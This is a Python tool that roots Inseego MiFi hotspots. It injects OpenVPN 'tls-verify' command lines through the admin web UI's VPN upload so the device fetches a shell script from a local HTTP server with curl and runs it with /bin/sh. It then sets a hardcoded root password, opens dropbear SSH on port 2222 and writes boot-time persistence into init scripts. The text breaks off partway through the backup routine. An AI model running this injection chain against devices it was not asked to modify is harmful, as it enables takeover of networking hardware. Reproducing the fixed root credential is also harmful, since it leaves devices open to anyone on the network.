#!/usr/bin/env python3
"""
Inseego MiFi M2xxx / M3xxx all in one root, backup and tweak tool
by JoshAtticus

Tested on an M3200 (Telstra, SDX65). Should be universal across M2xxx/M3xxx
devices but only tested on the M3200.


Requirements:  pip install paramiko requests
"""

import functools
import getpass
import hashlib
import http.server
import io
import json
import os
import re
import shlex
import shutil
import socket
import struct
import subprocess
import sys
import tarfile
import tempfile
import threading
import time
import zipfile
from pathlib import Path, PurePosixPath

import paramiko
import requests

try:
    os.system("")  # enable ANSI escapes on legacy Windows consoles
except Exception:
    pass

HOST = "192.168.1.1"
BASE = f"http://{HOST}"
SSH_PORT = 2222
TELNET_PORT = 2323
ROOT_PW = "Root@123"
PAYLOAD_PORT = 8000
PAYLOAD_LOCAL = "payload/root.sh"
FRAMEWORK = "M2xxx/M3xxx"

# ---------------------------------------------------------------- colours ---

RESET = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"


def clear():
    print("\033[2J\033[H", end="")


def banner():
    # raw string: the ASCII art contains backslashes that aren't escapes
    print(rf"""{CYAN}{BOLD}
              _   _     _ _           _     _              
   ___  _   _| |_| |__ | (_)_ __   __| |___| |_ ___  _ __  
  / _ \| | | | __| '_ \| | | '_ \ / _` / __| __/ _ \| '_ \ 
 | (_) | |_| | |_| |_) | | | | | | (_| \__ \ || (_) | |_) |
  \___/ \__,_|\__|_.__/|_|_|_| |_|\__,_|___/\__\___/| .__/ 
                                                    |_|    
{RESET}{DIM}                    Inseego {FRAMEWORK} tool (root / backup / tweak){RESET}""")


def fail(msg):
    print(f"{RED}{BOLD}ERROR: {msg}{RESET}")


def ok(msg):
    print(f"{GREEN}{msg}{RESET}")


def info(msg):
    print(f"{CYAN}{msg}{RESET}")


def warn(msg):
    print(f"{YELLOW}{msg}{RESET}")


# ------------------------------------------------------------- arrow keys ---

def read_key():
    """Returns 'up', 'down', 'enter', 'ctrlc' or the character pressed."""
    if os.name == "nt":
        import msvcrt
        ch = msvcrt.getch()
        if ch in (b"\x00", b"\xe0"):
            arrow = msvcrt.getch().decode(errors="ignore")
            return {"H": "up", "P": "down"}.get(arrow, "")
        if ch == b"\r":
            return "enter"
        if ch == b"\x03":
            return "ctrlc"
        return ch.decode(errors="ignore")
    import termios
    import tty
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    try:
        tty.setraw(fd)
        ch = sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)
    if ch == "\x1b":
        return {"A": "up", "B": "down"}.get(sys.stdin.read(1), "")
    return {"\r": "enter", "\n": "enter", "\x03": "ctrlc"}.get(ch, ch)


def menu(title, options, info_lines=()):
    """Draws an arrow-key menu, returns the chosen index. Ctrl+C = cancel (-1).
    Long lists are windowed to the terminal height so nothing scrolls off the
    top; hidden entries are marked with '... N more' indicator lines."""
    sel = 0
    start = 0
    while True:
        clear()
        banner()
        print(f"{BOLD}{MAGENTA}  {title}{RESET}\n")
        for line in info_lines:
            print(f"  {line}")
        print()
        try:
            rows = os.get_terminal_size().lines
        except OSError:
            rows = 30
        # fixed overhead: banner(8) + title(2) + blank(2) + indicators(2)
        # + footer(2) + slack(2), so the list always fits on one screen
        visible = max(4, rows - len(info_lines) - 18)
        if sel < start:
            start = sel
        elif sel >= start + visible:
            start = sel - visible + 1
        end = start + visible
        if start > 0:
            print(f"  {DIM}... {start} more above{RESET}")
        for i in range(start, min(end, len(options))):
            if i == sel:
                print(f"  {CYAN}{BOLD} > {options[i]}{RESET}")
            else:
                print(f"    {DIM}{options[i]}{RESET}")
        if end < len(options):
            print(f"  {DIM}... {len(options) - end} more below{RESET}")
        print(f"\n  {DIM}[arrows] move   [enter] select   [ctrl+c] back{RESET}")
        key = read_key()
        if key == "ctrlc":
            return -1
        if key == "up":
            sel = (sel - 1) % len(options)
        elif key == "down":
            sel = (sel + 1) % len(options)
        elif key == "enter":
            return sel


def prompt(msg, default=None):
    try:
        val = input(f"  {CYAN}{msg}{RESET}").strip()
    except EOFError:
        return default
    return val or default


def multi_menu(title, options, info_lines=()):
    """Checkbox menu: space toggles, enter confirms, Ctrl+C cancels.
    Returns the chosen option strings (possibly empty). Enter with nothing
    ticked does NOT exit - too easy to fat-finger enter expecting radio
    behaviour and have the whole flow vanish without a word."""
    if os.name == "nt":
        import msvcrt
        getch = msvcrt.getch
    else:
        getch = None
    picked = set()
    sel = 0
    hint = ""
    while True:
        clear()
        banner()
        print(f"{BOLD}{MAGENTA}  {title}{RESET}\n")
        for line in info_lines:
            print(f"  {line}")
        print()
        for i, opt in enumerate(options):
            box = "[x]" if i in picked else "[ ]"
            if i == sel:
                print(f"  {CYAN}{BOLD} > {box} {opt}{RESET}")
            else:
                print(f"    {DIM}{box} {opt}{RESET}")
        if hint:
            print(f"\n  {YELLOW}{hint}{RESET}")
        print(f"\n  {DIM}[arrows] move   [space] toggle   [enter] done   [ctrl+c] back{RESET}")
        if os.name == "nt":
            ch = getch()
            if ch in (b"\x00", b"\xe0"):
                arrow = getch().decode(errors="ignore")
                key = {"H": "up", "P": "down"}.get(arrow, "")
            elif ch == b"\r":
                key = "enter"
            elif ch == b"\x03":
                return []
            elif ch == b" ":
                key = "space"
            else:
                key = ""
        else:
            import termios
            import tty
            fd = sys.stdin.fileno()
            old = termios.tcgetattr(fd)
            try:
                tty.setraw(fd)
                ch = sys.stdin.read(1)
            finally:
                termios.tcsetattr(fd, termios.TCSADRAIN, old)
            if ch == "\x1b":
                key = {"A": "up", "B": "down"}.get(sys.stdin.read(1), "")
            elif ch in ("\r", "\n"):
                key = "enter"
            elif ch == "\x03":
                return []
            elif ch == " ":
                key = "space"
            else:
                key = ""
        if key == "up":
            sel = (sel - 1) % len(options)
            hint = ""
        elif key == "down":
            sel = (sel + 1) % len(options)
            hint = ""
        elif key == "space":
            picked.symmetric_difference_update({sel})
            hint = ""
        elif key == "enter":
            if not picked:
                hint = "nothing ticked yet - press space on the items you want"
                continue
            return [options[i] for i in sorted(picked)]


def pause(msg="press enter to continue"):
    try:
        input(f"\n  {DIM}{msg}...{RESET}")
    except EOFError:
        pass


# ------------------------------------------------------------ root probing --

def probe_root():
    """(ssh_up, root_authed). SSH is never up on a stock device, so ssh_up
    basically implies we rooted it before. 1.5s connect timeout."""
    s = socket.socket()
    s.settimeout(1.5)
    try:
        s.connect((HOST, SSH_PORT))
        s.close()
    except OSError:
        return False, False
    try:
        cli = ssh_connect(timeout=2)
        cli.close()
        return True, True
    except Exception:
        return True, False


def ssh_connect(timeout=3):
    cli = paramiko.SSHClient()
    cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    cli.connect(HOST, port=SSH_PORT, username="root", password=ROOT_PW,
                look_for_keys=False, allow_agent=False, timeout=timeout,
                banner_timeout=timeout, auth_timeout=timeout)
    return cli


def ssh_exec(cli, cmd, timeout=30):
    _, stdout, stderr = cli.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode(errors="replace").strip()
    rc = stdout.channel.recv_exit_status()
    return rc, out, stderr.read().decode(errors="replace").strip()


def ssh_ensure(cli):
    """Return a live ssh client, reconnecting if the device dropped us.
    Dropbear restarts right after rooting and kills idle sessions, so a
    client that was fine a moment ago can be dead by the time the user
    answers a menu. Re-check instead of crashing on a stale socket."""
    try:
        cli.exec_command("true", timeout=5)[1].read()
        return cli
    except Exception:
        try:
            cli.close()
        except Exception:
            pass
        last = None
        for _ in range(5):
            try:
                cli = ssh_connect()
                cli.exec_command("true", timeout=5)[1].read()
                ok("reconnected over ssh")
                return cli
            except Exception as e:
                last = e
                time.sleep(2)
        fail(f"could not reconnect over ssh: {last}")
        return None


def push_bytes(cli, path, data):
    """Write bytes to a device path via exec channel (dropbear has no sftp)."""
    chan = cli.get_transport().open_session()
    chan.exec_command(f"cat > {path}")
    chan.sendall(data)
    chan.shutdown_write()
    return chan.recv_exit_status()


# ---------------------------------------------------------- file transfers --

def pull_from_device(cli, remote_path, out_dir="pulled"):
    """Pull any file or folder off the device as a streamed tar and unpack it.
    tar czf - runs on the device so /tmp never has to hold the archive."""
    remote_path = remote_path.strip()
    expected = remote_path.strip("/")
    name = expected.replace("/", "_") or "root"
    out_dir = Path(out_dir)
    out_dir.mkdir(parents=True, exist_ok=True)
    tarball = out_dir / f"{name}.tar.gz"

    show_device_screen(cli, "operation-inprogress")
    print(f"  {CYAN}streaming {remote_path} -> {tarball}{RESET}")
    _, stdout, _ = cli.exec_command(f"tar czf - {shlex.quote(remote_path)}")
    with open(tarball, "wb") as f:
        while True:
            chunk = stdout.read(1 << 16)
            if not chunk:
                break
            f.write(chunk)
    rc = stdout.channel.recv_exit_status()
    if rc != 0 or tarball.stat().st_size == 0:
        fail(f"tar failed on device (exit {rc}) - does the path exist?")
        return None

    dest = out_dir / name
    skipped = 0

    def _pull_filter(member, path):
        # device trees are full of absolute symlinks (/sdcard -> /mnt/sdcard)
        # and dev nodes that the stock data filter aborts on. none of that
        # matters for a pull-to-PC copy, so skip those members instead.
        nonlocal skipped
        if member.issym() or member.islnk() or member.ischr() \
                or member.isblk() or member.isfifo():
            skipped += 1
            return None
        return tarfile.data_filter(member, path)

    with tarfile.open(tarball, "r:gz") as tf:
        members = tf.getmembers()
        for m in members:
            if not (m.name == expected or m.name.startswith(expected + "/")):
                fail(f"unexpected path in tar, refusing to extract: {m.name}")
                return None
        try:
            tf.extractall(dest, filter=_pull_filter)
        except TypeError:
            # paths already validated above, so the pre-3.12 call is safe
            tf.extractall(dest)

    files = [m for m in members if m.isfile()]
    ok(f"pulled {len(files)} files -> {dest}"
       + (f" ({skipped} symlinks/dev nodes skipped)" if skipped else ""))
    for m in sorted(files, key=lambda m: m.name):
        print(f"    {m.name}  ({m.size} B)")
    show_device_screen(cli, "operation-done")
    return dest


def push_to_device(cli, local_path, remote_path, make_exec=False):
    """Push a local file or folder tree to the device. The tar is built on the
    PC (Windows tarfile has no gzip streaming) and piped straight into
    'tar xzf -' on the device. Arcname is derived from the remote path so the
    file lands exactly where you asked."""
    local = Path(local_path)
    remote_path = remote_path.rstrip("/")
    # PurePosixPath, NOT Path: on Windows, Path() would rewrite the remote
    # path with backslashes, and busybox mkdir/tar would then create a
    # literal '\opt\...' directory in $HOME instead of the real target
    base = str(PurePosixPath(remote_path).parent)
    arcname = PurePosixPath(remote_path).name if local.is_file() else (
        PurePosixPath(remote_path).name or local.name)

    show_device_screen(cli, "operation-inprogress")
    cmd = f"mkdir -p {shlex.quote(base)} && tar xzf - -C {shlex.quote(base)}"
    with tempfile.TemporaryDirectory() as tmp:
        tarball = Path(tmp) / "push.tar.gz"
        with tarfile.open(tarball, "w:gz") as tf:
            tf.add(local, arcname=arcname)
            want = sum(1 for m in tf.getmembers() if m.isfile())
        chan = cli.get_transport().open_session()
        chan.exec_command(cmd)
        with open(tarball, "rb") as f:
            while True:
                chunk = f.read(1 << 16)
                if not chunk:
                    break
                chan.sendall(chunk)
        chan.shutdown_write()
        rc = chan.recv_exit_status()
    if rc != 0:
        fail(f"push failed on device (exit {rc})")
        return False

    # verify what actually landed, trust nothing
    if local.is_file():
        _, out, _ = ssh_exec(cli, f"md5sum {shlex.quote(remote_path)}")
        local_md5 = hashlib.md5(local.read_bytes()).hexdigest()
        if out.split()[0] != local_md5:
            fail("md5 mismatch after push!")
            return False
    else:
        _, out, _ = ssh_exec(cli, f"find {shlex.quote(remote_path)} -type f | wc -l")
        if int(out or -1) != want:
            fail(f"file count mismatch after push (device {out}, local {want})")
            return False
    if make_exec:
        ssh_exec(cli, f"chmod +x {shlex.quote(remote_path)}")
    ok(f"pushed {local} -> {remote_path} (verified)")
    show_device_screen(cli, "operation-done")
    return True


def device_list_dir(cli, path):
    """[(name, is_dir)] for a device path, dirs sorted first. None = bad path."""
    rc, out, err = ssh_exec(cli, f"ls -A1p {shlex.quote(path)} 2>/dev/null")
    if rc != 0:
        return None
    entries = []
    for line in out.splitlines():
        if not line:
            continue
        if line.endswith("/"):
            entries.append((line.rstrip("/"), True))
        else:
            entries.append((line, False))
    return sorted(entries, key=lambda e: (not e[1], e[0].lower()))


def flow_browse_pull(cli, out_dir="pulled"):
    """Arrow-key file browser over the device filesystem. Enter on a folder
    opens it, enter on a file pulls it straight away."""
    start = prompt("start browsing at:", "/") or "/"
    path = start
    while True:
        entries = device_list_dir(cli, path)
        if entries is None:
            fail(f"can't list {path}, jumping back to {start}")
            pause()
            path = start
            continue
        opts = [f"Pull this whole folder ({path})", ".. (up)"]
        opts += [n + ("/" if d else "") for n, d in entries]
        sel = menu("Files: browse", opts, info_lines=[
            f"device path: {BOLD}{path}{RESET}",
            f"{DIM}enter on a folder = open it, enter on a file = pull it{RESET}",
            f"{DIM}pulls land in {out_dir}/{RESET}",
        ])
        if sel == -1:
            return
        if sel == 0:
            pull_from_device(cli, path, out_dir)
            pause()
            continue
        if sel == 1:
            if path.rstrip("/") == "":
                continue  # already at /
            parent = str(PurePosixPath(path).parent)
            path = parent if parent != "" else "/"
            continue
        name, is_dir = entries[sel - 2]
        full = path.rstrip("/") + "/" + name
        if is_dir:
            path = full
            continue
        clear()
        banner()
        print()
        pull_from_device(cli, full, out_dir)
        pause()


def flow_files():
    clear()
    banner()
    print(f"  {BOLD}{MAGENTA}Files (push / pull over ssh){RESET}\n")
    up, authed = probe_root()
    if not authed:
        fail("root required (run Rooting first)")
        pause()
        return
    try:
        cli = ssh_connect()
    except Exception as e:
        fail(f"ssh failed: {e}")
        pause()
        return
    try:
        while True:
            sel = menu("Files", [
                "Browse device & pull (file browser)",
                "Pull a path (type it in)",
                "Push file/folder to device",
                "Back",
            ], info_lines=[
                f"{DIM}pulls land in pulled/ (device path becomes the subfolder).{RESET}",
                f"{DIM}pushes stream a tar into the device, md5-verified for files.{RESET}",
            ])
            if sel in (-1, 3):
                return
            clear()
            banner()
            print()
            if sel == 0:
                flow_browse_pull(cli)
            elif sel == 1:
                remote = prompt("remote path to pull:", "/WEBSERVER")
                if not remote:
                    continue
                out = prompt("local folder:", "pulled")
                pull_from_device(cli, remote, out)
            elif sel == 2:
                local = prompt("local file/folder to push:")
                if not local or not Path(local).exists():
                    fail(f"{local or '(empty)'} not found")
                    pause()
                    continue
                remote = prompt("remote destination path (full path):")
                if not remote:
                    continue
                warn(f"this overwrites {remote} on the device.")
                warn("init scripts are fine (restore from .pre-root), but never")
                warn("write into the flash partitions - those are mtd, not files.")
                if menu("Push now?", ["Cancel", "Push"]) != 1:
                    continue
                make_exec = menu("Make it executable (chmod +x)?",
                                 ["No", "Yes (for scripts)"]) == 1
                push_to_device(cli, local, remote, make_exec=make_exec)
            pause()
    finally:
        cli.close()


def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((HOST, 80))
        return s.getsockname()[0]
    finally:
        s.close()


# ------------------------------------------------------------- web client ---

def check_server():
    """The MiFi WebUI identifies itself with a 'Server: MiFi' header."""
    try:
        r = requests.get(BASE + "/", timeout=3)
    except requests.RequestException:
        return False, "no response. are you connected to the hotspot?"
    server = r.headers.get("Server", "")
    if "mifi" not in server.lower():
        return False, f"expected 'Server: MiFi', got '{server or 'none'}'"
    return True, server


def device_model(session):
    try:
        r = session.get(BASE + "/", timeout=3)
        m = re.search(r"<title>(.*?)</title>", r.text, re.IGNORECASE)
        return m.group(1).strip() if m else "unknown"
    except requests.RequestException:
        return "unknown"


def web_login(session, admin_pw):
    """The WebUI never sends the plaintext admin password. It sends
    sha1(password + gSecureToken). The token is per-page and rotates, so
    scrape it fresh from /login/ every time."""
    r = session.get(BASE + "/login/", timeout=5,
                    headers={"X-Requested-With": "XMLHttpRequest"})
    m = (re.search(r'var secToken = "([0-9a-f]{40})"', r.text)
         or re.search(r'name="gSecureToken" value="([0-9a-f]{40})"', r.text))
    if not m:
        return False, "could not find gSecureToken on the login page"
    token = m.group(1)
    sha = hashlib.sha1((admin_pw + token).encode()).hexdigest()
    r = session.post(BASE + "/submitLogin/",
                     data={"shaPassword": sha, "gSecureToken": token},
                     timeout=5,
                     headers={"X-Requested-With": "XMLHttpRequest"})
    if r.status_code != 200:
        return False, f"login rejected (HTTP {r.status_code}). wrong admin password?"
    # the submitLogin response echoes gIsLoggedIn:0 regardless of outcome -
    # the real answer is whether /vpn/ now serves the admin-only page
    r = session.get(BASE + "/vpn/", timeout=5)
    if re.search(r'isloggedIn = "1"', r.text) or 'name="gSecureToken" value=' in r.text:
        return True, token
    return False, "wrong admin password (session not authenticated)"


def vpn_token(session):
    r = session.get(BASE + "/vpn/", timeout=5)
    m = (re.search(r'name="gSecureToken" value="([0-9a-f]{40})"', r.text)
         or re.search(r'"gSecureToken":"([0-9a-f]{40})"', r.text))
    return m.group(1) if m else None


def vpn_clear(session, token):
    return session.post(BASE + "/vpn/clearVPNSettings/",
                        data={"gSecureToken": token}, timeout=10,
                        headers={"X-Requested-With": "XMLHttpRequest"})


def vpn_upload(session, token, filename, content):
    return session.post(BASE + "/vpn/",
                        data={"gSecureToken": token, "fileNames": filename,
                              "vpnUserName": "a", "vpnPassword": "a"},
                        files={"filesList": (filename, content,
                                             "application/octet-stream")},
                        timeout=20)


def vpn_connect(session, token):
    return session.post(BASE + "/vpn/connect/",
                        data={"gSecureToken": token}, timeout=10,
                        headers={"X-Requested-With": "XMLHttpRequest"})


# --------------------------------------------------- payload http server ----

class _PayloadHandler(http.server.SimpleHTTPRequestHandler):
    ps = None

    def do_GET(self):
        if self.path.split("?")[0] == "/payload/root.sh":
            self.ps.fetched.set()
        super().do_GET()

    def log_message(self, *args):
        pass


class PayloadServer(threading.Thread):
    """Serves the repo root so the device can fetch /payload/root.sh,
    and flags the moment the device actually downloads it."""

    def __init__(self):
        super().__init__(daemon=True)
        self.fetched = threading.Event()
        self.httpd = None

    def run(self):
        handler = type("_H", (_PayloadHandler,), {"ps": self})
        self.httpd = http.server.ThreadingHTTPServer(("0.0.0.0", PAYLOAD_PORT), handler)
        self.httpd.serve_forever()

    def stop(self):
        if self.httpd:
            self.httpd.shutdown()


# Base .ovpn search paths. The first hit containing a 'remote' line wins.
OVPN_SEARCH = [
    "ovpn",                                            # bundled NordVPN sample
    "local",                                          # your own configs (gitignored)
    ".",                                              # repo-local configs
]


def find_base_ovpn():
    """(path, text) of the first usable config, or (None, None).
    Exploit lines are stripped later, so even previous stage profiles work."""
    seen = set()
    for d in OVPN_SEARCH:
        d = Path(d)
        if not d.exists():
            continue
        for f in sorted(d.glob("*.ovpn")):
            if f.resolve() in seen:
                continue
            seen.add(f.resolve())
            try:
                text = f.read_text(errors="replace")
            except OSError:
                continue
            if "remote " in text:
                return f, text
    return None, None


def build_stage_configs(base_text, local_ip):
    """Strip any exploit lines from the base config (it may be a previous
    stage profile), then append ours. The tab on tls-verify is sacred."""
    lines = [l for l in base_text.splitlines()
             if l.strip() != "script-security 2"
             and not l.strip().startswith("tls-verify")]
    base = "\n".join(lines).rstrip() + "\n\n"
    stage1 = base + (
        "script-security 2\n"
        f'\ttls-verify "/usr/bin/curl -o /tmp/root.sh '
        f'http://{local_ip}:{PAYLOAD_PORT}/payload/root.sh"\n'
    )
    stage2 = base + (
        "script-security 2\n"
        '\ttls-verify "/bin/sh /tmp/root.sh"\n'
    )
    return stage1, stage2


# ----------------------------------------------------------------- flows ----

def flow_root(state):
    clear()
    banner()
    print(f"  {BOLD}{MAGENTA}Rooting (OpenVPN tls-verify injection){RESET}\n")

    up, authed = probe_root()
    if authed:
        warn("root SSH is already up. re-running the exploit is harmless (it")
        warn("just re-applies the password and re-starts dropbear), so test away.")
        if menu("Run the exploit again?", ["Cancel", "Run it anyway"]) != 1:
            return
        clear()
        banner()
        print()

    if not Path(PAYLOAD_LOCAL).exists():
        fail(f"{PAYLOAD_LOCAL} not found next to this script")
        pause()
        return

    warn("You need a working OpenVPN client config (.ovpn) that the device can")
    warn("connect to. Credentials do NOT need to be valid")
    warn("THE DEVICE MUST HAVE A WORKING INTERNET CONNECTION FOR THE EXPLOIT TO SUCCEED")

    auto_path, auto_text = find_base_ovpn()
    if auto_path:
        info(f"auto-selected base config: {auto_path}")
        default_base = str(auto_path)
    else:
        default_base = "m3200-stage1 copy.ovpn"
        warn("no .ovpn found automatically, please enter a path manually")
    base_path = prompt(f"base .ovpn [enter = {default_base}]:", default_base)
    base_file = Path(base_path)
    if base_file.exists():
        base_text = base_file.read_text(errors="replace")
    elif base_path == default_base and auto_text:
        base_text = auto_text
    else:
        fail(f"{base_path} not found")
        pause()
        return
    if "remote " not in base_text:
        fail("that file doesn't look like an OpenVPN config (no 'remote' line)")
        pause()
        return

    local_ip = get_local_ip()
    info(f"your LAN IP (payload server): {local_ip}:{PAYLOAD_PORT}")
    warn("default admin password = the default WiFi password (also shown on the device in")
    warn("Menu > Settings > Advanced Settings).")
    admin_pw = getpass.getpass("  admin password: ")
    info("logging into the WebUI...")

    session = requests.Session()
    oklogin, msg = web_login(session, admin_pw)
    if not oklogin:
        fail(f"WebUI login failed: {msg}")
        pause()
        return
    ok("logged into WebUI")

    stage1, stage2 = build_stage_configs(base_text, local_ip)

    ps = PayloadServer()
    ps.start()
    info(f"payload server listening on :{PAYLOAD_PORT} (serving {Path.cwd()})")

    try:
        # ---- stage 1: plant /tmp/root.sh
        info("uploading stage 1...")
        token = vpn_token(session)
        if not token:
            fail("could not scrape gSecureToken from /vpn/. are you logged in?")
            return
        vpn_clear(session, token)
        token = vpn_token(session)
        r = vpn_upload(session, token, "mifi_stage1.ovpn", stage1)
        info(f"stage 1 uploaded (HTTP {r.status_code})")
        token = vpn_token(session)
        info("executing stage 1...")
        vpn_connect(session, token)
        ok("stage 1 executed! waiting for the device to fetch the payload...")

        if not ps.fetched.wait(30):
            fail("device didn't fetch payload within 30 seconds, aborting")
            fail("the device needs an internet connection (cellular data) to")
            fail("reach the VPN server. without the handshake there is no payload.")
            fail("other causes: VPN server down, firewall blocking :8000, wrong IP")
            return
        ok("device fetched the payload!")

        # ---- stage 2: execute it
        token = vpn_token(session)
        info("preparing to execute stage 2...")
        vpn_clear(session, token)
        token = vpn_token(session)
        info("uploading stage 2...")
        vpn_upload(session, token, "mifi_stage2.ovpn", stage2)
        token = vpn_token(session)
        info("executing stage 2...")
        vpn_connect(session, token)
        ok("stage 2 executed! waiting for ssh...")

        # ---- wait for dropbear
        for i in range(45):
            up, authed = probe_root()
            if authed:
                break
            time.sleep(2)
        if not authed:
            fail("uh oh, ssh never came up, check the VPN log in the WebUI")
            return

        ok(f"root acquired! ssh -p 2222 root@{HOST} (password {ROOT_PW})")
    finally:
        ps.stop()

    try:
        cli = ssh_connect()
    except Exception as e:
        fail(f"ssh dropped: {e}")
        pause()
        return
    # first ssh of the rooting process: tell the human on the device that
    # the tool is still working (persistence question comes up next)
    show_device_screen(cli, "inprogress")
    sel = menu("Install root persistence now?",
               ["Yes (survives reboots)", "No (later)"], info_lines=[])
    # the user may have sat at that menu while dropbear restarted underneath us
    cli = ssh_ensure(cli)
    if not cli:
        pause()
        return
    if sel == 0 and flow_persistence(cli):
        persisted = True
    else:
        persisted = False
    # rooting extra: offer a stock animation backup + the bundled
    # outblindstop animation while we have root right here
    cli = ssh_ensure(cli)
    if cli:
        cli = flow_root_startup_offer(cli)
        cli = ssh_ensure(cli) if cli else None
    if not cli:
        pause()
        return
    if persisted:
        show_device_screen(cli, "success")
    else:
        show_device_screen(cli, "temproot-success")
    cli.close()
    pause()


def show_device_screen(cli, name):
    """Push assets/<name>.png to the device and put it on the 320x240 screen.
    Silent on success - the device screen IS the feedback. The success image
    has its Yay! button positioned right over the device UI's
    connected-devices button, so tapping it opens the menu through the touch
    layer, no ssh needed afterwards."""
    src = Path("assets") / f"{name}.png"
    if not src.exists():
        warn(f"{src} missing, skipping the {name} screen")
        return
    data = src.read_bytes()
    if data[25] == 6:  # RGBA. mifi_display_png only accepts RGB
        try:
            import io
            from PIL import Image
            buf = io.BytesIO()
            Image.open(src).convert("RGB").save(buf, "PNG")
            data = buf.getvalue()
        except ImportError:
            warn(f"{name}.png is RGBA and PIL isn't installed, skipping (pip install pillow)")
            return
    ssh_exec(cli, "mkdir -p /data/yay")
    if push_bytes(cli, "/data/yay/yay_1.png", data) == 0:
        ssh_exec(cli, "LD_LIBRARY_PATH=/opt/nvtl/lib /opt/nvtl/bin/mifi_display_png /data/yay/yay_ 1")


PERSISTENCE_MARKER = "# --- root persistence (added by mifi_tool) ---"
PERSISTENCE_FILES = [
    "/opt/nvtl/bin/init-SDX65.sh",     # SDX65 (M3000/M3100/M3200)
    "/opt/nvtl/bin/init-SDX55.sh",     # SDX55 (M2000)
    "/opt/nvtl/bin/syslogd_monitor.sh",
]


def persistence_installed(cli):
    """True if our persistence block is live in any of the init scripts."""
    for cand in PERSISTENCE_FILES:
        _, out, _ = ssh_exec(cli, f"grep -cF '{PERSISTENCE_MARKER}' {cand} 2>/dev/null")
        if out and out != "0":
            return True
    return False


def flow_unroot(cli):
    clear()
    banner()
    print(f"  {BOLD}{MAGENTA}Uninstall root{RESET}\n")
    warn("this removes persistence and stops dropbear/telnetd. The root")
    warn("password stays " + ROOT_PW + " but stock builds have no ssh, so it's")
    warn("only reachable over serial/console. The WebUI is untouched.")
    if menu("Continue?", ["Cancel", "Uninstall"]) != 1:
        return
    MARKER = PERSISTENCE_MARKER
    CANDIDATES = PERSISTENCE_FILES
    target = None
    for cand in CANDIDATES:
        _, out, _ = ssh_exec(cli, f"[ -f {cand} ] && echo yes")
        if out == "yes":
            target = cand
            break
    if not target:
        fail(f"none of {CANDIDATES} exist, nothing to uninstall?")
        return
    _, out, _ = ssh_exec(cli, f"[ -f {target}.pre-root ] && echo yes")
    if out == "yes":
        rc, _, err = ssh_exec(cli, f"cp {target}.pre-root {target}")
        if rc == 0:
            ok(f"restored {target} from .pre-root backup")
        else:
            fail(f"restore failed: {err}. DO NOT reboot")
            return
    else:
        _, raw, _ = ssh_exec(cli, f"cat {target}")
        lines = [l for l in raw.splitlines()
                 if l.strip() != MARKER
                 and "passwd root" not in l
                 and "dropbear -r /etc/dropbear" not in l]
        chan = cli.get_transport().open_session()
        chan.exec_command(f"cat > {target}")
        chan.sendall(("\n".join(lines) + "\n").encode())
        chan.shutdown_write()
        if chan.recv_exit_status() != 0:
            fail("failed to clean init script. DO NOT reboot")
            return
        ok(f"persistence block stripped from {target}")
    # put the unroot screen up while ssh still works, then kill services last.
    # dropping dropbear kills our own ssh session, so detach the kill into a
    # background sleep to let the response go out first
    show_device_screen(cli, "unroot-success")
    ssh_exec(cli, "nohup sh -c 'sleep 1; kill $(pidof dropbear) $(pidof telnetd)' >/dev/null 2>&1 &")
    ok("root uninstalled. ssh/telnet are down, device behaves as stock")


def flow_persistence(cli):
    """Returns True only if persistence is verifiably installed afterwards."""
    MARKER = PERSISTENCE_MARKER
    CANDIDATES = PERSISTENCE_FILES
    block = [
        MARKER,
        'echo -e "Root@123\\nRoot@123" | passwd root',
        "/usr/sbin/dropbear -r /etc/dropbear/dropbear_rsa_key -p 2222",
    ]
    target = None
    for cand in CANDIDATES:
        rc, out, _ = ssh_exec(cli, f"[ -f {cand} ] && echo yes")
        if out == "yes":
            target = cand
            break
    if not target:
        fail(f"none of {CANDIDATES} exist on this device")
        return False

    _, raw, _ = ssh_exec(cli, f"cat {target}")
    if MARKER in raw:
        ok(f"persistence already present in {target}")
        return True
    lines = [l for l in raw.splitlines()
             if l.strip() != MARKER
             and "passwd root" not in l
             and "dropbear -r /etc/dropbear" not in l]
    ssh_exec(cli, f"[ -f {target}.pre-root ] || cp {target} {target}.pre-root")
    # insert before the first 'exit 0' or the block never runs
    try:
        idx = next(i for i, l in enumerate(lines) if l.strip() == "exit 0")
    except StopIteration:
        idx = len(lines)
    lines[idx:idx] = block
    chan = cli.get_transport().open_session()
    chan.exec_command(f"cat > {target}")
    chan.sendall(("\n".join(lines) + "\n").encode())
    chan.shutdown_write()
    rc = chan.recv_exit_status()
    if rc != 0:
        fail("failed to write init script. persistence NOT installed")
        return False
    _, out, _ = ssh_exec(cli, f"grep -c dropbear {target}")
    if int(out or 0) >= 1:
        ok(f"persistence installed in {target} (backup: {target}.pre-root)")
        return True
    else:
        fail("verification failed. DO NOT reboot until this is fixed")
        return False


def flow_backup():
    clear()
    banner()
    print(f"  {BOLD}{MAGENTA}Backup (dump all MTD partitions){RESET}\n")
    up, authed = probe_root()
    if not authed:
        fail("root required (run Rooting first)")
        pause()
        return

    cli = ssh_connect()
    out_dir = Path("backup")
    out_dir.mkdir(exist_ok=True)

    rc, mtd, _ = ssh_exec(cli, "cat /proc/mtd")
    parts = []
    for line in mtd.splitlines()[1:]:
        m = re.match(r'mtd(\d+):\s+([0-9a-fA-F]+)\s+[0-9a-fA-F]+\s+"(.*)"', line.strip())
        if m:
            parts.append((int(m.group(1)), int(m.group(2), 16), m.group(3)))
    if not parts:
        fail("could not parse /proc/mtd")
        pause()
        return

    warn("these dumps are your ONLY recovery path (no firehose exists).")
    warn("copy the backup/ folder somewhere safe when this finishes.\n")

    show_device_screen(cli, "operation-inprogress")

    bad = 0
    for num, size, name in parts:
        out = out_dir / f"mtd{num}_{name}.bin"
        print(f"  {CYAN}mtd{num}{RESET} {name:<15} {size / 1048576:7.1f} MiB ... ", end="", flush=True)
        _, stdout, _ = cli.exec_command(f"dd if=/dev/mtdblock{num} bs=4096")
        with open(out, "wb") as f:
            while True:
                chunk = stdout.read(1 << 20)
                if not chunk:
                    break
                f.write(chunk)
        rc = stdout.channel.recv_exit_status()
        actual = out.stat().st_size
        if rc != 0 or actual != size:
            print(f"{RED}FAILED (rc={rc}, {actual} bytes){RESET}")
            bad += 1
        else:
